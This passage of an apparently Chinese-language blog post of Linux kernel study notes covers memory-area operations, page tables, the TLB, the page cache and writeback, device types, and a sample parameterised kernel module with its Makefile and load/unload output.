&#123;</span></span><br><span class="line">	<span class="keyword">void</span> (*open)(struct vm_area_struct * area); <span class="comment">/* 把指定vma与一个地址空间绑定 */</span></span><br><span class="line">	<span class="keyword">void</span> (*close)(struct vm_area_struct * area); <span class="comment">/* 把指定vma的地址空间删除 */</span></span><br><span class="line">	<span class="keyword">int</span> (*split)(struct vm_area_struct * area, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr);</span><br><span class="line">	<span class="keyword">int</span> (*mremap)(struct vm_area_struct * area);</span><br><span class="line">	<span class="keyword">vm_fault_t</span> (*fault)(struct vm_fault *vmf); </span><br><span class="line">	<span class="keyword">vm_fault_t</span> (*huge_fault)(struct vm_fault *vmf,</span><br><span class="line">			<span class="keyword">enum</span> page_entry_size pe_size);</span><br><span class="line">	<span class="keyword">void</span> (*map_pages)(struct vm_fault *vmf,</span><br><span class="line">			<span class="keyword">pgoff_t</span> start_pgoff, <span class="keyword">pgoff_t</span> end_pgoff);</span><br><span class="line">	<span class="function"><span class="keyword">unsigned</span> <span class="title">long</span> <span class="params">(*pagesize)</span><span class="params">(struct vm_area_struct * area)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* notification that a previously read-only page is about to become</span></span><br><span class="line"><span class="comment">	 * writable, if an error is returned it will cause a SIGBUS */</span></span><br><span class="line">	<span class="keyword">vm_fault_t</span> (*page_mkwrite)(struct vm_fault *vmf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* same as page_mkwrite when using VM_PFNMAP|VM_MIXEDMAP */</span></span><br><span class="line">	<span class="keyword">vm_fault_t</span> (*pfn_mkwrite)(struct vm_fault *vmf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* called by access_process_vm when get_user_pages() fails, typically</span></span><br><span class="line"><span class="comment">	 * for use by special VMAs that can switch between memory and hardware</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*access)(struct vm_area_struct *vma, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span><br><span class="line">		      <span class="keyword">void</span> *buf, <span class="keyword">int</span> len, <span class="keyword">int</span> write);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Called by the /proc/PID/maps code to ask the vma whether it</span></span><br><span class="line"><span class="comment">	 * has a special name.  Returning non-NULL will also cause this</span></span><br><span class="line"><span class="comment">	 * vma to be dumped unconditionally. */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *(*name)(struct vm_area_struct *vma);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * set_policy() op must add a reference to any non-NULL @new mempolicy</span></span><br><span class="line"><span class="comment">	 * to hold the policy upon return.  Caller should pass NULL @new to</span></span><br><span class="line"><span class="comment">	 * remove a policy and fall back to surrounding context--i.e. do not</span></span><br><span class="line"><span class="comment">	 * install a MPOL_DEFAULT policy, nor the task or system default</span></span><br><span class="line"><span class="comment">	 * mempolicy.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*set_policy)(struct vm_area_struct *vma, struct mempolicy *<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * get_policy() op must add reference [mpol_get()] to any policy at</span></span><br><span class="line"><span class="comment">	 * (vma,addr) marked as MPOL_SHARED.  The shared policy infrastructure</span></span><br><span class="line"><span class="comment">	 * in mm/mempolicy.c will do this automatically.</span></span><br><span class="line"><span class="comment">	 * get_policy() must NOT add a ref if the policy at (vma,addr) is not</span></span><br><span class="line"><span class="comment">	 * marked as MPOL_SHARED. vma policies are protected by the mmap_sem.</span></span><br><span class="line"><span class="comment">	 * If no [shared/vma] mempolicy exists at the addr, get_policy() op</span></span><br><span class="line"><span class="comment">	 * must return NULL--i.e., do not &quot;fallback&quot; to task or system default</span></span><br><span class="line"><span class="comment">	 * policy.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mempolicy</span> *(*<span class="title">get_policy</span>)(<span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>,</span></span><br><span class="line"><span class="class">					<span class="title">unsigned</span> <span class="title">long</span> <span class="title">addr</span>);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Called by vm_normal_page() for special PTEs to find the</span></span><br><span class="line"><span class="comment">	 * page for @addr.  This is useful if the default behavior</span></span><br><span class="line"><span class="comment">	 * (using pte_page()) would not find the correct page.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *(*<span class="title">find_special_page</span>)(<span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>,</span></span><br><span class="line"><span class="class">					  <span class="title">unsigned</span> <span class="title">long</span> <span class="title">addr</span>);</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>地址空间和页表</strong></p>
<p>地址空间中的地址都是虚拟内存中的地址，而CPU需要操作的是物理内存（内核操作的也是物理内存），所以需要一个将虚拟地址映射到物理地址的机制</p>
<p>这个机制就是页表，linux 中使用3级页面来完成虚拟地址到物理地址的转换</p>
<ul>
<li>PGD - 全局页目录，包含一个 pgd_t 类型数组，多数体系结构中 pgd_t 类型就是一个无符号长整型</li>
<li>PMD - 中间页目录，它是个 pmd_t 类型数组</li>
<li>PTE - 简称页表，包含一个 pte_t 类型的页表项，该页表项指向物理页面</li>
</ul>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661508765929-1666871176498.png" class width="1661508765929"> 
<p><strong>翻译后缓存器-translate lookaside buffer-TLB</strong></p>
<p>搜索物理地址的速度很有限，因此为了加快搜索，TLB 机制诞生了</p>
<ul>
<li>TLB 其实就是一块高速缓存 </li>
<li>当请求访问一个虚拟地址时，处理器会先检查 TLB 中是否缓存了该虚拟地址到物理地址的映射</li>
</ul>
<h2 id="页高速缓存-amp-页回写"><a href="#页高速缓存-amp-页回写" class="headerlink" title="页高速缓存&amp;页回写"></a>页高速缓存&amp;页回写</h2><p>为了提高 I/O 性能，也引入了缓存机制，即将一部分磁盘上的数据缓存到内存中 </p>
<p>之所以通过缓存能提高 I/O 性能是基于以下2个重要的原理：</p>
<ul>
<li>CPU访问内存的速度远远大于访问磁盘的速度（访问速度差距不是一般的大，差好几个数量级）</li>
<li>数据一旦被访问，就有可能在短期内再次被访问（临时局部原理）</li>
</ul>
<p><strong>页高速缓存</strong></p>
<p>页缓存和硬件 cache 的原理基本相同，将容量大而低速设备中的部分数据存放到容量小而快速的设备中，这样速度快的设备将作为低速设备的缓存，当访问低速设备中的数据时，可以直接从缓存中获取数据而不需再访问低速设备，从而节省了整体的访问时间</p>
<ul>
<li>页高速缓存缓存的是具体的物理页面，与前面章节中提到的虚拟内存空间 vm_area_struct 不同</li>
<li>假设有进程创建了多个 vm_area_struct 都指向同一个文件，那么这个 vm_area_struct 对应的页高速缓存只有一份</li>
<li>也就是磁盘上的文件缓存到内存后，它的虚拟内存地址可以有多个，但是物理内存地址却只能有一个</li>
</ul>
<p>为了有效提高 I/O 性能，页高速缓存要需要满足以下条件：</p>
<ul>
<li>能够快速检索需要的内存页是否存在</li>
<li>能够快速定位脏页面（也就是被写过，但还没有同步到磁盘上的数据）</li>
<li>页高速缓存被并发访问时，尽量减少并发锁带来的性能损失</li>
</ul>
<p>实现页高速缓存的最重要的结构体要算是 address_space：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span>        *<span class="title">host</span>;</span>        		<span class="comment">/* 拥有此address_space的inode对象 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">radix_tree_root</span>    <span class="title">page_tree</span>;</span>    <span class="comment">/* 包含全部页面的radix树 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        tree_lock;   		    <span class="comment">/* 保护radix树的自旋锁 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        i_mmap_writable;	<span class="comment">/* VM_SHARED计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">prio_tree_root</span>    <span class="title">i_mmap</span>;</span>        <span class="comment">/* 私有映射链表的树 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">i_mmap_nonlinear</span>;</span>	<span class="comment">/* VM_NONLINEAR链表 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        i_mmap_lock;   	    <span class="comment">/* 保护i_map的自旋锁 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        truncate_count;     <span class="comment">/* 截断计数 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        nrpages;    		<span class="comment">/* 总页数 */</span></span><br><span class="line">    <span class="keyword">pgoff_t</span>            writeback_index;		<span class="comment">/* 回写的起始偏移 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">address_space_operations</span> *<span class="title">a_ops</span>;</span>    <span class="comment">/* address_space的操作表 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span>        flags;        				<span class="comment">/* gfp_mask掩码与错误标识 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">backing_dev_info</span> *<span class="title">backing_dev_info</span>;</span> 		 <span class="comment">/* 预读信息 */</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        private_lock;   		 <span class="comment">/* 私有address_space自旋锁 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">private_list</span>;</span>   	 <span class="comment">/* 私有address_space链表 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>    *<span class="title">assoc_mapping</span>;</span>  <span class="comment">/* 缓冲 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span class="title">unmap_mutex</span>;</span>    	 <span class="comment">/* 保护未映射页的mutux锁 */</span></span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="keyword">long</span>))));</span><br></pre></td></tr></table></figure>
<p>这里的 Radix 树（基数树）就是页高速缓存的底层算法</p>
<p><strong>页回写</strong></p>
<p>由于页高速缓存的作用，写操作实际上会被延迟，当页高速缓存中的数据更新，但是后台存储的数据还没有更新时，该数据就被称为脏数据</p>
<ul>
<li>在内存中累积起来的脏页最终必须被写回磁盘</li>
<li>而写回磁盘的操作就被称为页回写</li>
</ul>
<p>Linux 页高速缓存页中的回写是由内核中的 <code>flusher</code> 线程来完成的，<code>flusher</code> 线程在以下3种情况发生时，触发回写操作：</p>
<ul>
<li>一，当空闲内存低于一个阀值时：<ul>
<li>空闲内存不足时，需要释放一部分缓存</li>
<li>由于只有不脏的页面才能被释放，所以要把脏页面都回写到磁盘，使其变成干净的页面</li>
</ul>
</li>
<li>二，当脏页在内存中驻留时间超过一个阀值时：<ul>
<li>确保脏页面不会无限期的驻留在内存中，从而减少了数据丢失的风险</li>
</ul>
</li>
<li>三，当用户进程调用 <code>sync()</code> 和 <code>fsync()</code> 系统调用时：<ul>
<li>给用户提供一种强制回写的方法，应对回写要求严格的场景</li>
</ul>
</li>
</ul>
<p>但页回写的条件满足时，内核便会调用 <code>wakeup_flusher_threads</code> 来唤醒一个或者多个 <code>flusher</code> 线程，然后 <code>flusher</code> 线程会将脏页写回磁盘</p>
<h2 id="设备-amp-模块"><a href="#设备-amp-模块" class="headerlink" title="设备&amp;模块"></a>设备&amp;模块</h2><p><strong>设备类型</strong></p>
<p>Linux 中主要由3种类型的设备，分别是：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left"><strong>设备类型</strong></th>
<th style="text-align:left"><strong>代表设备</strong></th>
<th style="text-align:left"><strong>特点</strong></th>
<th style="text-align:left"><strong>访问方式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">块设备</td>
<td style="text-align:left">硬盘，光盘</td>
<td style="text-align:left">随机访问设备中的内容</td>
<td style="text-align:left">一般都是把设备挂载为文件系统后再访问</td>
</tr>
<tr>
<td style="text-align:left">字符设备</td>
<td style="text-align:left">键盘，打印机</td>
<td style="text-align:left">只能顺序访问（一个一个字符或者一个一个字节）</td>
<td style="text-align:left">一般不挂载，直接和设备交互</td>
</tr>
<tr>
<td style="text-align:left">网络设备</td>
<td style="text-align:left">网卡</td>
<td style="text-align:left">打破了Unix “所有东西都是文件” 的设计原则</td>
<td style="text-align:left">通过套接字API来访问</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>除了以上3种典型的设备之外，其实Linux中还有一些其他的设备类型，其中见的较多的应该算是”伪设备”</li>
<li>所谓”伪设备”，其实就是一些虚拟的设备，仅提供访问内核功能而已，没有物理设备与之关联</li>
<li>典型的”伪设备”就是 /dev/random(内核随机数发生器)， /dev/null(空设备)， /dev/zero(零设备)， /dev/full(满设备)</li>
</ul>
<p><strong>设备结构体</strong></p>
<p>用于描述一个字符设备：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="keyword">dev_t</span> dev;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> count;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于不同的文件系统，<code>file_operations</code> 的内容不同</li>
<li>内核对象 <code>kobj</code> 用于统一设备模型</li>
</ul>
<p><strong>内核模块</strong></p>
<p>Linux 内核是模块化组成的，内核中的模块可以按需加载，从而保证内核启动时不用加载所有的模块，即减少了内核的大小，也提高了效率</p>
<ul>
<li>通过编写内核模块来给内核增加功能或者接口是个很好的方式（既不用重新编译内核，也方便调试和删除）</li>
</ul>
<p>带参数的内核模块的示例：（我在网上抄了个示例，打 kernel pwn 的时候可能会用到）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span>* name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_student</span><span class="params">(struct student*)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> stu_id = <span class="number">0</span>;  <span class="comment">// 默认id</span></span><br><span class="line">module_param(stu_id, <span class="keyword">int</span>, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(stu_id, <span class="string">&quot;学生ID，默认为 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* stu_name_in = <span class="string">&quot;default name&quot;</span>; <span class="comment">// 默认名字</span></span><br><span class="line">module_param_named(stu_name_out, stu_name_in ,charp, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(stu_name, <span class="string">&quot;学生姓名，默认为 default name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ARR_LEN 5</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> arr_len;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> arr_in[MAX_ARR_LEN];</span><br><span class="line">module_param_array_named(arr_out, arr_in, <span class="keyword">int</span>, &amp;arr_len, <span class="number">0644</span>);</span><br><span class="line">MODULE_PARM_DESC(arr_in, <span class="string">&quot;数组参数，默认为空&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_paramed_km_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span>* <span class="title">stu1</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* 进入内核模块 */</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;test_paramed_km is inited!\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 根据参数生成 struct student 信息</span></span><br><span class="line">    <span class="comment">// 如果没有参数就用默认参数</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;alloc one student....\n&quot;</span>);</span><br><span class="line">    stu1 = kmalloc(<span class="keyword">sizeof</span>(*stu1), GFP_KERNEL);</span><br><span class="line">    stu1-&gt;id = stu_id;</span><br><span class="line">    stu1-&gt;name = stu_name_in;</span><br><span class="line">    print_student(stu1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模块数组</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; arr_len; ++i) &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;arr_value[%d]: %d\n&quot;</span>, i, arr_in[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test_paramed_km_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 退出内核模块 */</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;test_paramed_km is exited!\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;*************************\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;\n\n\n\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_student</span><span class="params">(struct student *stu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stu != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;**********student info***********\n&quot;</span>);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;student id   is: %d\n&quot;</span>, stu-&gt;id);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;student name is: %s\n&quot;</span>, stu-&gt;name);</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;*********************************\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;the student info is null!!\n&quot;</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(test_paramed_km_init);</span><br><span class="line">module_exit(test_paramed_km_exit);</span><br></pre></td></tr></table></figure>
<p>上面的示例对应的 Makefile 如下： </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> must complile on customize kernel</span></span><br><span class="line">obj-m += paramed_km.o</span><br><span class="line">paramed_km-objs := test_paramed_km.o</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">generate the path</span></span><br><span class="line">CURRENT_PATH:=$(shell pwd)</span><br><span class="line"><span class="meta">#</span><span class="bash">the current kernel version number</span></span><br><span class="line">LINUX_KERNEL:=$(shell uname -r)</span><br><span class="line"><span class="meta">#</span><span class="bash">the absolute path</span></span><br><span class="line">LINUX_KERNEL_PATH:=/usr/src/kernels/$(LINUX_KERNEL)</span><br><span class="line"><span class="meta">#</span><span class="bash">complie object</span></span><br><span class="line">all:</span><br><span class="line">    make -C $(LINUX_KERNEL_PATH) M=$(CURRENT_PATH) modules</span><br><span class="line">    rm -rf modules.order Module.symvers .*.cmd *.o *.mod.c .tmp_versions *.unsigned</span><br><span class="line"><span class="meta">#</span><span class="bash">clean</span></span><br><span class="line">clean:</span><br><span class="line">    rm -rf modules.order Module.symvers .*.cmd *.o *.mod.c *.ko .tmp_versions *.unsigned</span><br></pre></td></tr></table></figure>
<p>内核模块运行方法：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">[root@vbox chap17]# ll   &lt;-- 编译内核后,多了paramed_km.ko文件</span><br><span class="line">total 124</span><br><span class="line">-rw-r--r-- 1 root root    538 Dec  1 19:37 Makefile</span><br><span class="line">-rw-r--r-- 1 root root 118352 Dec  1 19:37 paramed_km.ko</span><br><span class="line">-rw-r--r-- 1 root root   2155 Dec  1 19:37 test_paramed_km.c</span><br><span class="line"></span><br><span class="line">&lt;-- 通过 modinfo 命令可以查看对内核模块参数的注释</span><br><span class="line">[root@vbox chap17]# modinfo  paramed_km.ko</span><br><span class="line">filename:       paramed_km.ko</span><br><span class="line">license:        Dual BSD/GPL</span><br><span class="line">srcversion:     C52F97687B033738742800D</span><br><span class="line">depends:</span><br><span class="line">vermagic:       2.6.32-279.el6.x86_64 SMP mod_unload modversions</span><br><span class="line">parm:           stu_id:学生ID，默认为 0 (int)</span><br><span class="line">parm:           stu_name_out:charp</span><br><span class="line">parm:           stu_name_in:学生姓名，默认为 default name</span><br><span class="line">parm:           arr_out:array of int</span><br><span class="line">parm:           arr_in:数组参数，默认为空</span><br><span class="line"></span><br><span class="line">&lt;-- 3 个参数都是默认的</span><br><span class="line">[root@vbox chap17]# insmod paramed_km.ko</span><br><span class="line">[root@vbox chap17]# rmmod paramed_km.ko</span><br><span class="line">[root@vbox chap17]# dmesg | tail -16  &lt;-- 结果中显示2个默认参数,第3个数组参数默认为空,所以不显示</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is inited!</span><br><span class="line">*************************</span><br><span class="line">alloc one student....</span><br><span class="line">**********student info***********</span><br><span class="line">student id   is: 0</span><br><span class="line">student name is: default name</span><br><span class="line">*********************************</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is exited!</span><br><span class="line">*************************</span><br><span class="line"></span><br><span class="line">&lt;-- 3 个参数都被设置</span><br><span class="line">[root@vbox chap17]# insmod paramed_km.ko stu_id=100 stu_name_out=myname arr_out=1,2,3,4,5</span><br><span class="line">[root@vbox chap17]# rmmod paramed_km.ko</span><br><span class="line">[root@vbox chap17]# dmesg | tail -21</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is inited!</span><br><span class="line">*************************</span><br><span class="line">alloc one student....</span><br><span class="line">**********student info***********</span><br><span class="line">student id   is: 100</span><br><span class="line">student name is: myname</span><br><span class="line">*********************************</span><br><span class="line">arr_value[0]: 1</span><br><span class="line">arr_value[1]: 2</span><br><span class="line">arr_value[2]: 3</span><br><span class="line">arr_value[3]: 4</span><br><span class="line">arr_value[4]: 5</span><br><span class="line">*************************</span><br><span class="line">test_paramed_km is exited!</span><br><span class="line">*************************</span><br></pre></td></tr></table></figure>
<p><strong>内核对象</strong></p>
<p>Linux-2.6-kernel 中增加了一个引人注目的新特性：统一设备模型(device model)</p>
<ul>
<li>统一设备模型的最初动机是为了实现智能的电源管理，linux 内核为了实现智能电源管理，需要建立表示系统中所有设备拓扑关系的树结构</li>
<li>这样在关闭电源时，可以从树的节点开始关闭</li>
</ul>
<p>实现了统一设备模型之后，还给内核带来了如下的好处:</p>
<ul>
<li>代码重复最小化（统一处理的东西多了）</li>
<li>可以列举系统中所有设备，观察它们的状态，并查看它们连接的总线</li>
<li>可以将系统中的全部设备以树的形式完整，有效的展示出来—包括所有总线和内部连接</li>
<li>可以将设备和其对应的驱动联系起来，反之亦然</li>
<li>可以将设备按照类型加以归类，无需理解物理设备的拓扑结构</li>
<li>可以沿设备树的叶子向其根的反向依次遍历，以保证能以正确的顺序关闭设备电源</li>
</ul>
<p>kobject：</p>
<p>统一设备模型的核心部分就是 kobject，通过下面对 kobject 结构体的介绍，可以大致了解它是如何使得各个物理设备能够以树结构的形式组织起来的</p>
